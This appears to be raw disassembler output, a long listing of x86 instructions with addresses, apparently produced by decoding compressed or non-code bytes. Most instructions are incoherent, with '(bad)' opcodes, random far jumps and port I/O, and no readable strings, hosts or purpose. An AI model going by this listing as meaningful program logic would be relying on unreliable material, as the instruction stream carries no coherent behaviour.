  424319:	les    edi,FWORD PTR [esi+0x51]
  42431c:	xor    DWORD PTR [eax],0x44
  42431f:	imul   esi,ecx,0xffffffa6
  424322:	push   0x4e
  424324:	out    dx,al
  424325:	jb     0x4242b3
  424327:	xor    eax,0xc326c176
  42432c:	ds jne 0x42434f
  42432f:	and    al,0xa9
  424331:	add    esi,esp
  424333:	and    DWORD PTR [eax],eax
  424335:	ins    BYTE PTR es:[edi],dx
  424336:	shl    DWORD PTR [esi-0x5f],1
  424339:	loop   0x42431d
  42433b:	inc    esp
  42433c:	cs out 0xa5,al
  42433f:	pop    ecx
  424340:	xchg   ebx,eax
  424341:	add    cl,BYTE PTR [edx+0x79271e85]
  424347:	sbb    al,0xba
  424349:	iret   
  42434a:	retf   
  42434b:	popa   
  42434c:	mov    esi,0xb98f0978
  424351:	and    edi,DWORD PTR [esi]
  424353:	jnp    0x424316
  424355:	sbb    eax,0x33b008
  42435a:	into   
  42435b:	aas    
  42435c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42435d:	in     eax,0x10
  42435f:	cld    
  424360:	dec    ecx
  424361:	data16 gs daa 
  424364:	mov    BYTE PTR [edi+ebx*1-0xcb1ca64],al
  42436b:	ja     0x42434e
  42436d:	mov    edi,0x9fc2e8e9
  424372:	cmp    ch,BYTE PTR [edx+ecx*4+0x25]
  424376:	stos   BYTE PTR es:[edi],al
  424377:	(bad)  
  424378:	adc    DWORD PTR [edx],edx
  42437a:	mov    bh,0x51
  42437c:	jmp    0x692db50a
  424381:	in     eax,0x98
  424383:	cdq    
  424384:	mov    dh,0xdc
  424386:	sahf   
  424387:	std    
  424388:	and    eax,0x8e48706a
  42438d:	ss stos DWORD PTR es:[edi],eax
  42438f:	mov    ecx,0xa3
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243d3
  424401:	push   edx
  424402:	scas   eax,DWORD PTR es:[edi]
  424403:	mov    esp,0x18342
  424408:	add    eax,0x13000001
  42440d:	adc    al,0xf
  42440f:	cmc    
  424410:	jae    0x424477
  424412:	dec    eax
  424413:	lods   al,BYTE PTR ds:[esi]
  424414:	mov    ?,esp
  424416:	xchg   ebp,eax
  424417:	(bad)  
  424418:	mov    ds:0xc143ba44,eax
  42441d:	scas   al,BYTE PTR es:[edi]
  42441e:	nop
  42441f:	enter  0x4ce0,0x17
  424423:	icebp  
  424424:	fs jmp 0xb5ea:0xa3cea740
  42442c:	sbb    eax,0x6eb0786d
  424431:	fs ret 0x2898
  424435:	jmp    0x4243fb
  424437:	pop    eax
  424438:	popf   
  424439:	or     BYTE PTR [ebx+eiz*2+0xf01ab0e],al
  424440:	mov    ebx,0x4b52602e
  424445:	cmc    
  424446:	sbb    BYTE PTR [edx],ch
  424448:	scas   eax,DWORD PTR es:[edi]
  424449:	arpl   WORD PTR [edi],bx
  42444b:	aas    
  42444c:	cmc    
  42444d:	dec    edx
  42444e:	(bad)  
  42444f:	cmp    DWORD PTR [esi],eax
  424451:	xchg   esp,eax
  424452:	imul   BYTE PTR [ecx-0x24be0ed]
  424458:	and    ah,0xe2
  42445b:	pop    edx
  42445c:	jl     0x424483
  42445e:	ret    0x8076
  424461:	push   esi
  424462:	(bad)  
  424464:	inc    ecx
  424465:	add    edx,ecx
  424467:	jno    0x424499
  424469:	add    ah,BYTE PTR [ebp+0x38]
  42446c:	jl     0x4244b1
  42446e:	shl    BYTE PTR [edx+0x124700cc],1
  424474:	xchg   esi,eax
  424475:	xlat   BYTE PTR ds:[ebx]
  424476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424477:	aam    0x73
  424479:	sar    DWORD PTR [esi+0x22073f81],0x39
  424480:	and    esi,DWORD PTR [eax+ecx*8]
  424483:	ror    DWORD PTR [ebp+0x30],0x5a
  424487:	jbe    0x42442b
  424489:	and    al,0x7a
  42448b:	cmp    eax,0x96236332
  424490:	mov    ds:0x279bef4a,al
  424495:	jmp    0xf1cd:0xd9f3675e
  42449c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42449e:	(bad)  
  42449f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244a0:	retf   0x2e18
  4244a3:	imul   edi,DWORD PTR [ebx-0x3901c6d6],0x69605ba5
  4244ad:	jmp    0x4244c8
  4244af:	cdq    
  4244b0:	mov    esp,0x6f17c2a9
  4244b5:	cmp    al,0x9d
  4244b7:	jge    0x4244e7
  4244b9:	dec    esi
  4244ba:	adc    dl,bl
  4244bc:	dec    esi
  4244bd:	les    ebx,FWORD PTR ds:0x395b65c8
  4244c3:	rcr    DWORD PTR [ecx-0x44ccefd],0xe4
  4244ca:	pushf  
  4244cb:	pop    ss
  4244cc:	fmul   st(0),st
  4244ce:	push   ebx
  4244cf:	lock pusha 
  4244d1:	addr16 sub al,0xd
  4244d4:	ret    0xa01a
  4244d7:	call   0xc1d2fd54
  4244dc:	das    
  4244dd:	sub    ebp,DWORD PTR [esi]
  4244df:	mov    ds:0x4dcfb2ee,eax
  4244e4:	pop    edx
  4244e5:	aad    0x82
  4244e7:	dec    ecx
  4244e8:	lods   al,BYTE PTR ds:[esi]
  4244e9:	je     0x4244dc
  4244eb:	mov    ebx,0x58a22fb1
  4244f0:	inc    eax
  4244f1:	fstp   QWORD PTR [eax+0x3f]
  4244f4:	and    bh,BYTE PTR [edi+0x2f]
  4244f7:	mov    edi,ebx
  4244f9:	popa   
  4244fa:	ins    DWORD PTR es:[edi],dx
  4244fb:	inc    esi
  4244fc:	cmp    al,0xb3
  4244fe:	mov    WORD PTR [ebx+0x1f],?
  424501:	dec    esp
  424502:	mov    dh,0xe8
  424504:	mov    ah,0xd6
  424506:	inc    esp
  424507:	test   eax,0xbeba0c8b
  42450c:	pop    edx
  42450d:	pop    ss
  42450e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42450f:	fmul   QWORD PTR [esi+0x0]
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x1b],1
  424581:	xchg   ebx,eax
  424582:	fisub  WORD PTR [edx+0x18447]
  424588:	add    eax,0x6f000001
  42458d:	cmp    ebx,DWORD PTR [ecx+ebp*2-0x17]
  424591:	push   0x90414730
  424596:	call   DWORD PTR [esi+esi*1+0x49]
  42459a:	test   al,0xfe
  42459c:	stos   BYTE PTR es:[edi],al
  42459d:	cli    
  42459e:	jno    0x42460a
  4245a0:	mov    dh,0xc8
  4245a2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4245a4:	adc    ah,BYTE PTR [ebx]
  4245a6:	(bad)  
  4245a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245a8:	arpl   WORD PTR [edx+0x5f],cx
  4245ab:	jmp    0xe1cbd124
  4245b0:	(bad)  
  4245b1:	jge    0x424559
  4245b3:	stos   BYTE PTR es:[edi],al
  4245b4:	mov    bl,0x27
  4245b6:	push   ecx
  4245b7:	je     0x42455d
  4245b9:	out    dx,eax
  4245ba:	lds    edx,FWORD PTR [eax+0x146d77ef]
  4245c0:	je     0x424573
  4245c2:	pop    esi
  4245c3:	or     eax,0x238de8a6
  4245c8:	jmp    0x1882:0xf5658458
  4245cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245d0:	and    ah,BYTE PTR [edi+0x121e5f14]
  4245d6:	int    0xce
  4245d8:	ror    BYTE PTR [ebp+0x6e],cl
  4245db:	test   BYTE PTR [ebp*2+0xfb6b3dd],cl
  4245e2:	mov    cl,BYTE PTR [ebp+0x64]
  4245e5:	jmp    0xb5791f80
  4245ea:	ins    DWORD PTR es:[edi],dx
  4245eb:	and    ecx,esp
  4245ed:	xchg   esi,eax
  4245ee:	add    esi,esi
  4245f0:	int    0xa2
  4245f2:	(bad)  
  4245f3:	jb     0x4245c3
  4245f5:	mov    ds:0xd90c57fd,eax
  4245fa:	(bad)  
  4245fb:	cld    
  4245fc:	xchg   ecx,eax
  4245fd:	(bad)  
  4245fe:	iret   
  4245ff:	cmp    DWORD PTR [esi],0xffffffaf
  424602:	sub    DWORD PTR [eax-0x26],ecx
  424605:	mov    DWORD PTR [esi-0x63],edx
  424608:	aaa    
  424609:	and    al,0xff
  42460b:	sbb    al,0xa5
  42460d:	adc    dh,0xb8
  424610:	cs std 
  424612:	pop    esp
  424613:	and    edx,esi
  424615:	sti    
  424616:	xor    DWORD PTR [ebp+0x3e],ecx
  424619:	jle    0x424622
  42461b:	adc    eax,0xca34087b
  424620:	iret   
  424621:	jns    0x424670
  424623:	cmc    
  424624:	xor    al,0xe5
  424626:	call   0x1439f394
  42462b:	in     al,dx
  42462c:	add    al,0x18
  42462e:	adc    DWORD PTR [edi+0x1b3e1441],edx
  424634:	out    dx,al
  424635:	shl    BYTE PTR [esi+0x3a59058f],cl
  42463b:	cli    
  42463c:	loope  0x4245d8
  42463e:	mov    edx,0x5f651686
  424643:	cli    
  424644:	mov    ch,0x6a
  424646:	les    ebx,FWORD PTR [edi+0x19]
  424649:	mov    ds:0x4eb84b3e,al
  42464e:	add    DWORD PTR [esi+0x7bd7dc74],0xffffff8a
  424655:	xchg   esi,eax
  424656:	cld    
  424657:	dec    ebx
  424658:	mov    ds:0x92a19007,eax
  42465d:	gs dec ecx
  42465f:	or     ah,BYTE PTR [esi]
  424661:	and    BYTE PTR [edi+0x7f],cl
  424664:	push   ss
  424665:	ins    DWORD PTR es:[edi],dx
  424666:	or     bh,BYTE PTR [ebx+0x4d]
  424669:	pusha  
  42466a:	lods   al,BYTE PTR ds:[esi]
  42466b:	cmc    
  42466c:	mov    bl,BYTE PTR [eax]
  42466e:	xchg   edx,eax
  42466f:	add    DWORD PTR [edx],0xffffffbd
  424672:	lock cli 
  424674:	inc    edx
  424675:	(bad)  
  424677:	xor    BYTE PTR [eax+0xfb3ffa],dh
  42467d:	ins    DWORD PTR es:[edi],dx
  42467e:	pusha  
  42467f:	aad    0x27
  424681:	mov    ch,BYTE PTR [edx-0x2f]
  424684:	dec    ebx
  424685:	jg     0x42464e
  424687:	popf   
  424688:	inc    edi
  424689:	mov    ebx,0x6bd26d72
  42468e:	(bad)  
  424690:	in     eax,0x0
	...
  4246f2:	add    BYTE PTR [eax],al
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [eax],bh
  424701:	ret    
  424702:	pop    ds
  424703:	je     0x424751
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x3e000001,al
  42470d:	push   ss
  42470e:	xor    DWORD PTR [edx+esi*2],0x34
  424712:	mov    ds:0x52f9b19e,al
  424717:	push   esp
  424718:	jmp    DWORD PTR [ecx-0x5b21e324]
  42471e:	iret   
  42471f:	scas   eax,DWORD PTR es:[edi]
  424720:	pop    eax
  424721:	jae    0x424789
  424723:	lahf   
  424724:	dec    ebp
  424725:	js     0x424788
  424727:	mov    al,0x99
  424729:	cmp    BYTE PTR [ecx+eax*2+0x35],0xcd
  42472e:	push   edi
  42472f:	push   ecx
  424730:	inc    esi
  424731:	loope  0x4246c3
  424733:	inc    ebp
  424734:	lock retf 0xf5fb
  424738:	add    BYTE PTR [ebx+ebp*2+0x706fc37f],ah
  42473f:	xchg   BYTE PTR [edi-0x581bc36b],dh
  424745:	inc    edi
  424746:	adc    BYTE PTR [ebx-0x6a],cl
  424749:	pop    edx
  42474a:	mov    ch,bh
  42474c:	and    cl,BYTE PTR [ecx]
  42474e:	bound  ebp,QWORD PTR [ebp+0x53]
  424751:	mov    DWORD PTR [edx-0x6c562112],esi
  424757:	add    al,0xf7
  424759:	jo     0x4247d1
  42475b:	add    al,0x1b
  42475d:	data16 fucomp st(6)
  424760:	dec    edi
  424761:	xor    eax,0xa38c3026
  424766:	call   0xb5da:0xe04fd48b
  42476d:	dec    eax
  42476e:	stos   DWORD PTR es:[edi],eax
  42476f:	inc    edi
  424770:	out    0xa7,eax
  424772:	or     ecx,ecx
  424774:	retf   
  424775:	xchg   edi,eax
  424776:	ss mov ch,BYTE PTR cs:[esi]
  42477a:	or     DWORD PTR [eax-0x5],esp
  42477d:	icebp  
  42477e:	test   eax,0xc37c8d30
  424783:	add    BYTE PTR [edx+eax*8+0x47],cl
  424787:	jp     0x424731
  424789:	adc    eax,0x6af1eb70
  42478e:	pop    es
  42478f:	out    0x16,eax
  424791:	or     BYTE PTR [ebp-0x31],bh
  424794:	rol    BYTE PTR [ebp+0x17],0x79
  424798:	pushf  
  424799:	addr16 mov esi,0xe3490305
  42479f:	xchg   esp,eax
  4247a0:	mov    esp,0x62c1141c
  4247a5:	add    al,0x71
  4247a7:	xchg   edx,eax
  4247a8:	shl    DWORD PTR [esi],1
  4247aa:	sbb    al,0xf
  4247ac:	ret    0xb4e7
  4247af:	sub    DWORD PTR [ebx],0xffffffb4
  4247b2:	dec    eax
  4247b3:	loope  0x4247bd
  4247b5:	lahf   
  4247b6:	dec    ecx
  4247b7:	sti    
  4247b8:	push   0x8eaa51e1
  4247bd:	loop   0x424798
  4247bf:	test   BYTE PTR [ebx+0x4b],al
  4247c2:	mov    ds:0xe9693553,eax
  4247c7:	mov    bh,0x6c
  4247c9:	jmp    0x54f53e27
  4247ce:	test   eax,0x4894ebf3
  4247d3:	ret    
  4247d4:	cmp    DWORD PTR [edx+ebx*1],eax
  4247d7:	es jnp 0x4247e7
  4247da:	cmc    
  4247db:	mov    fs,WORD PTR [ebx-0x7755010c]
  4247e1:	sahf   
  4247e2:	out    0xfb,al
  4247e4:	mov    ebp,0xf1099aff
  4247e9:	mov    dl,0x1c
  4247eb:	pop    esi
  4247ec:	nop
  4247ed:	arpl   si,cx
  4247ef:	in     eax,dx
  4247f0:	cli    
  4247f1:	inc    edx
  4247f2:	div    BYTE PTR [edi+eiz*2]
  4247f5:	ins    DWORD PTR es:[edi],dx
  4247f6:	xor    DWORD PTR [edi],ebp
  4247f8:	jp     0x4247b5
  4247fa:	sbb    eax,ebx
  4247fc:	mov    al,0x1a
  4247fe:	pop    eax
  4247ff:	loop   0x42481f
  424801:	lar    ebp,WORD PTR [esi]
  424804:	mov    WORD PTR [ebx],gs
  424806:	xchg   esp,eax
  424807:	(bad)  
  424808:	push   eax
  42480a:	adc    DWORD PTR [ecx],0xffffff96
  42480d:	jo     0x4247fc
  42480f:	pop    es
  424810:	pop    esi
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424881:	mov    cs,edx
  424883:	and    al,0x51
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0x6d000001,al
  42488d:	mov    eax,ds:0x47240c56
  424892:	dec    esi
  424893:	jle    0x424822
  424895:	(bad)  
  424896:	cmp    DWORD PTR [esi+0x6],ecx
  424899:	loope  0x4248f8
  42489b:	mov    ds:0xb470f1ac,al
  4248a0:	xchg   DWORD PTR [esi-0x31],eax
  4248a3:	fnop   
  4248a5:	pop    edi
  4248a6:	imul   eax,DWORD PTR [esi+0x43ebce04],0xd94a753d
  4248b0:	mov    al,0xef
  4248b2:	inc    eax
  4248b4:	jmp    0x4248f6
  4248b6:	mov    esi,0x7ce91989
  4248bb:	(bad)  
  4248bd:	fwait
  4248be:	sub    eax,0xd3cb8a90
  4248c3:	mov    al,ds:0x8767bb7c
  4248c8:	dec    esi
  4248c9:	out    dx,al
  4248ca:	mov    eax,0x1793c041
  4248cf:	into   
  4248d0:	daa    
  4248d1:	stos   BYTE PTR es:[edi],al
  4248d2:	test   BYTE PTR [edx+eax*2],dl
  4248d5:	in     al,dx
  4248d6:	dec    edx
  4248d7:	test   BYTE PTR [esi-0x2ed81989],al
  4248dd:	repnz popa 
  4248df:	jbe    0x4248c9
  4248e1:	mov    al,ds:0xa69098bc
  4248e6:	mov    BYTE PTR [edx+edi*4+0x3e],dh
  4248ea:	and    BYTE PTR [esi-0x2e],0xe6
  4248ee:	xchg   edx,eax
  4248ef:	fdiv   st(5),st
  4248f1:	lds    eax,FWORD PTR es:[eax+0x70]
  4248f5:	adc    ch,BYTE PTR [edi+ebx*2]
  4248f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248f9:	push   es
  4248fa:	and    esp,DWORD PTR [esi+0x5]
  4248fd:	inc    edi
  4248fe:	std    
  4248ff:	jnp    0x42495c
  424901:	retf   0x2e7d
  424904:	ficom  WORD PTR [edi+0x5aeff63e]
  42490a:	or     ch,BYTE PTR [ebp+0x15]
  42490d:	cmp    ecx,DWORD PTR [edx+0x6f]
  424910:	push   ebx
  424911:	pusha  
  424912:	xor    al,0x29
  424914:	push   esi
  424915:	loopne 0x4248ad
  424917:	je     0x424983
  424919:	ret    
  42491a:	imul   esp,esi,0x3403fae7
  424920:	xor    eax,0xbdeadd75
  424925:	dec    ecx
  424926:	enter  0xdf3a,0x79
  42492a:	pop    edx
  42492b:	xlat   BYTE PTR ds:[ebx]
  42492c:	dec    edi
  42492d:	cmp    eax,0x52e7605e
  424932:	push   es
  424933:	push   ds
  424934:	sbb    edi,DWORD PTR [edi]
  424936:	add    eax,0xe4ec6d7f
  42493b:	rol    DWORD PTR [ebx+ebp*4-0x6994ba86],1
  424942:	sbb    al,0xde
  424944:	adc    DWORD PTR [ecx+edx*8],ecx
  424947:	jl     0x424951
  424949:	fldenv [edi-0x51373244]
  42494f:	icebp  
  424950:	cmp    eax,0xb29f1f26
  424955:	inc    edx
  424956:	and    eax,esi
  424958:	adc    BYTE PTR [eax],bl
  42495a:	sub    edx,DWORD PTR ds:0x7f463b0e
  424960:	cld    
  424961:	das    
  424962:	inc    ecx
  424963:	out    dx,eax
  424964:	push   cs
  424965:	loop   0x424974
  424967:	xchg   DWORD PTR [eax+0x4aaa6e60],esp
  42496d:	cmp    eax,0x1b37da3c
  424972:	je     0x424903
  424974:	mov    bl,0x71
  424976:	sub    esp,DWORD PTR [edx+0x68c6f63c]
  42497c:	adc    edi,0x68a37f8b
  424982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424983:	and    BYTE PTR [esi-0x52ef3ace],0xbe
  42498a:	rol    DWORD PTR [ebp+0x3b503adb],0x5a
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bl,BYTE PTR [eax+0x43]
  424a02:	sar    DWORD PTR ds:0x18756,0x5
  424a09:	add    DWORD PTR [eax],eax
  424a0b:	add    BYTE PTR [edx-0x6b10e605],al
  424a11:	adc    edx,DWORD PTR [ebx-0x46b5cc49]
  424a17:	(bad)  
  424a19:	dec    ecx
  424a1a:	out    dx,al
  424a1b:	ret    
  424a1c:	stc    
  424a1d:	pop    edx
  424a1e:	pop    ds
  424a1f:	loopne 0x424a7a
  424a21:	daa    
  424a22:	jbe    0x424a1e
  424a24:	inc    ebp
  424a25:	xrelease xchg DWORD PTR ds:0xe01496d4,ebx
  424a2c:	sbb    eax,0xce1aa687
  424a31:	(bad)  
  424a32:	adc    al,0x54
  424a34:	in     eax,dx
  424a35:	icebp  
  424a36:	pop    es
  424a37:	mov    eax,ds:0x210ccbdc
  424a3c:	ret    
  424a3d:	fs leave 
  424a3f:	sub    eax,0x724689b0
  424a44:	loop   0x424a1c
  424a46:	mov    ch,0x86
  424a48:	pushf  
  424a49:	lock or eax,0x927f408d
  424a4f:	fs push esp
  424a51:	jns    0x424a2d
  424a53:	pmaxub mm6,QWORD PTR [ebx-0x9]
  424a57:	xorps  xmm0,XMMWORD PTR ds:0xb88084c0
  424a5e:	inc    edx
  424a5f:	aam    0xa1
  424a61:	loopne 0x424abc
  424a63:	fbstp  TBYTE PTR [edi+ebx*1-0x77]
  424a67:	icebp  
  424a68:	and    al,0x43
  424a6a:	mov    eax,0x64d66ea
  424a6f:	ins    BYTE PTR es:[edi],dx
  424a70:	and    ch,ah
  424a72:	lea    edx,[eax+eax*4-0x61]
  424a76:	mov    dh,BYTE PTR [ebx]
  424a78:	add    DWORD PTR [ebx+0x0],esi
  424a7b:	mov    ebp,0x924b5ed
  424a80:	mov    esi,DWORD PTR [esi]
  424a82:	xchg   ebx,eax
  424a83:	xchg   BYTE PTR [esp+edi*4],dh
  424a86:	daa    
  424a87:	and    eax,0x12fcd98c
  424a8c:	ja     0x424a74
  424a8e:	xchg   BYTE PTR [ebp-0x7a91f7f5],bh
  424a94:	mov    ds:0x884ed549,eax
  424a99:	test   BYTE PTR [edi-0x5c],bl
  424a9c:	retf   
  424a9d:	add    esi,esp
  424a9f:	(bad)  
  424aa1:	sub    bh,BYTE PTR [ebp+0x6be9e4fe]
  424aa7:	scas   al,BYTE PTR es:[edi]
  424aa8:	sbb    DWORD PTR [edi-0x7d],esp
  424aab:	mov    bh,0xad
  424aad:	xchg   ebx,eax
  424aae:	add    al,0xef
  424ab0:	sbb    esi,ebp
  424ab2:	stc    
  424ab3:	and    BYTE PTR [esi-0x41184542],0xdc
  424aba:	xlat   BYTE PTR ds:[ebx]
  424abb:	mov    dl,0x3b
  424abd:	cdq    
  424abe:	dec    esi
  424abf:	sti    
  424ac0:	jecxz  0x424b14
  424ac2:	sbb    al,0x7
  424ac4:	jmp    0xac086145
  424ac9:	xor    BYTE PTR [esi+0x43],0xea
  424acd:	or     al,cl
  424acf:	pop    edx
  424ad0:	mov    ds:0xcc931c17,eax
  424ad5:	jmp    0xe38d865
  424ada:	sahf   
  424adb:	call   0x35b23cd5
  424ae0:	cmp    eax,0xba7a3fe1
  424ae5:	inc    eax
  424ae6:	mov    edx,0xe4d7380d
  424aeb:	add    bl,BYTE PTR [edx-0x2]
  424aee:	setge  al
  424af1:	mov    dh,0xfe
  424af3:	add    ebx,0x3b
  424af6:	jne    0x424b51
  424af8:	lea    esi,[edx-0x29]
  424afb:	retf   0xb364
  424afe:	pop    ecx
  424aff:	xor    eax,0xbe3c1b52
  424b04:	or     ch,BYTE PTR [ecx]
  424b06:	jne    0x424ac5
  424b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b09:	pushf  
  424b0a:	jle    0x424acb
  424b0c:	jo     0x424b76
  424b0e:	pminsw mm5,QWORD PTR [ebx+0x0]
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	cmc    
  424b81:	jmp    0x889dacaf
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    eax,0xe6000001
  424b8d:	fldenv ds:0x6a3120be
  424b93:	jg     0x424b95
  424b95:	xchg   edi,eax
  424b96:	lea    ebp,[edx]
  424b98:	enter  0xc766,0x43
  424b9c:	test   DWORD PTR [ebx-0x34],edi
  424b9f:	mov    al,0x62
  424ba1:	jns    0x424b2a
  424ba3:	ret    0xdb1b
  424ba6:	outs   dx,DWORD PTR ds:[esi]
  424ba7:	sti    
  424ba8:	mov    ds:0xf7b74511,al
  424bad:	add    ecx,DWORD PTR [ebx]
  424baf:	lea    edx,[esi-0x5f1daffc]
  424bb5:	test   eax,0x47adc1c6
  424bba:	inc    esp
  424bbb:	add    al,0x2a
  424bbd:	pop    ds
  424bbe:	add    ch,dl
  424bc0:	jle    0x424bd2
  424bc2:	mov    ebx,0x348b41aa
  424bc7:	stos   DWORD PTR es:[edi],eax
  424bc8:	xchg   DWORD PTR [edx],edx
  424bca:	sub    al,0x5c
  424bcc:	es out dx,eax
  424bce:	jg     0x424b6b
  424bd0:	jmp    0x424c1d
  424bd2:	ja     0x424c07
  424bd4:	adc    DWORD PTR [esi],0xfffffff4
  424bd7:	mov    ecx,0xcea1ba71
  424bdc:	repz repnz sbb DWORD PTR [esi+0x14998f4b],0x7786ca28
  424be8:	jmp    0x424be2
  424bea:	ins    DWORD PTR es:[edi],dx
  424beb:	add    bl,BYTE PTR [ebx]
  424bed:	test   DWORD PTR [ebx],ecx
  424bef:	rcl    BYTE PTR [eax],cl
  424bf1:	clc    
  424bf2:	pop    ebx
  424bf3:	sbb    eax,0x6b616673
  424bf8:	jmp    0x7adc:0xd8edb497
  424bff:	mov    dl,0x38
  424c01:	add    al,0xd8
  424c03:	ret    
  424c04:	pop    edi
  424c05:	into   
  424c06:	iret   
  424c07:	adc    edx,DWORD PTR [edx+0x62da5c02]
  424c0d:	adc    DWORD PTR [edi-0x4c],eax
  424c10:	in     al,0xc1
  424c12:	inc    esi
  424c13:	mov    dl,0x22
  424c15:	stos   DWORD PTR es:[edi],eax
  424c16:	(bad)  
  424c17:	ror    DWORD PTR [edi],1
  424c19:	data16 cmp al,0x59
  424c1c:	and    BYTE PTR [ecx-0x15],0xe1
  424c20:	xor    DWORD PTR [ebx+0x21],0xffffffb4
  424c24:	gs jp  0x424c89
  424c27:	imul   ebx
  424c29:	clc    
  424c2a:	push   0xe2566ede
  424c2f:	ss xchg ebx,eax
  424c31:	xchg   esi,eax
  424c32:	ja     0x424c13
  424c34:	or     ch,BYTE PTR [ecx]
  424c36:	adc    DWORD PTR [edx+0x28],esp
  424c39:	xchg   BYTE PTR [edx+0x3fd3b569],ah
  424c3f:	add    bl,bh
  424c41:	dec    edi
  424c42:	mov    ebx,0x7f92afb
  424c47:	(bad)  
  424c48:	mov    ah,0x1f
  424c4a:	jae    0x424cc9
  424c4c:	mov    cl,al
  424c4e:	mov    al,0x9
  424c50:	push   ss
  424c51:	or     eax,edi
  424c53:	sbb    esp,DWORD PTR [edi+0x38]
  424c56:	pop    eax
  424c57:	ds in  al,0x81
  424c5a:	push   eax
  424c5b:	aas    
  424c5c:	jne    0x424cd0
  424c5e:	jp     0x424c5b
  424c60:	fcomp  st(7)
  424c62:	stos   DWORD PTR es:[edi],eax
  424c63:	sub    bh,BYTE PTR [edi]
  424c65:	popf   
  424c66:	mov    BYTE PTR [ecx+0x66],cl
  424c69:	dec    esp
  424c6a:	push   ebp
  424c6b:	test   al,0xb4
  424c6d:	and    eax,0x6b27fd57
  424c72:	xlat   BYTE PTR ds:[ebx]
  424c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c74:	jle    0x424c14
  424c76:	loop   0x424c09
  424c78:	or     eax,0x7865d8de
  424c7d:	imul   ebx,DWORD PTR ds:0xf4c2b4d3,0xab07a8cb
  424c87:	push   edi
  424c88:	sub    eax,0xa254ac97
  424c8d:	jbe    0x424c44
  424c8f:	jo     0x424ce5
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	gs inc edx
  424d02:	(bad)  
  424d03:	enter  0x8960,0x1
  424d07:	add    BYTE PTR ds:0x12000001,al
  424d0d:	adc    eax,0x7b44df24
  424d12:	xor    ebx,0xffffff87
  424d15:	cmp    eax,0xbffd8b69
  424d1a:	test   DWORD PTR ds:0x92e498e9,edi
  424d20:	das    
  424d21:	mov    ah,0x56
  424d23:	cmp    al,0xd7
  424d25:	inc    ecx
  424d26:	jle    0x424d49
  424d28:	out    dx,eax
  424d29:	rep lods eax,DWORD PTR ds:[esi]
  424d2b:	rcl    DWORD PTR ds:0xefecd2c7,1
  424d31:	dec    esp
  424d32:	xchg   esp,eax
  424d33:	call   0xc178:0xb5a8cbc2
  424d3a:	adc    BYTE PTR [ebp-0xb1b5050],0x45
  424d41:	(bad)  
  424d42:	cmc    
  424d43:	(bad)  
  424d44:	into   
  424d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d46:	adc    al,0x61
  424d48:	in     al,0x7c
  424d4a:	jmp    0x104cfb36
  424d4f:	scas   eax,DWORD PTR es:[edi]
  424d50:	stos   DWORD PTR es:[edi],eax
  424d51:	(bad)  
  424d52:	mov    ecx,0x981ecb0
  424d57:	(bad)  
  424d58:	fist   DWORD PTR [eax-0xaba306f]
  424d5e:	xor    eax,0xaf923c42
  424d63:	fdivp  st(7),st
  424d65:	add    BYTE PTR [ebp+eiz*8-0x12],al
  424d69:	jae    0x424d88
  424d6b:	aam    0x35
  424d6d:	inc    edx
  424d6e:	test   DWORD PTR [esi+ebx*1+0x30a46909],ecx
  424d75:	mov    ss,WORD PTR [esp+edi*2+0x7e3c0a27]
  424d7c:	pop    ds
  424d7d:	(bad)  
  424d7e:	cli    
  424d7f:	pop    ecx
  424d80:	jne    0x424d3c
  424d82:	out    dx,al
  424d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d84:	and    ah,BYTE PTR [esp+edx*1]
  424d87:	cmp    DWORD PTR [eax],0x3f
  424d8a:	or     ch,BYTE PTR [eiz*2-0x61153305]
  424d91:	loopne 0x424d29
  424d93:	rcr    DWORD PTR [ebp-0x398acc99],1
  424d99:	xchg   ebx,eax
  424d9a:	daa    
  424d9b:	add    eax,0x9cca0568
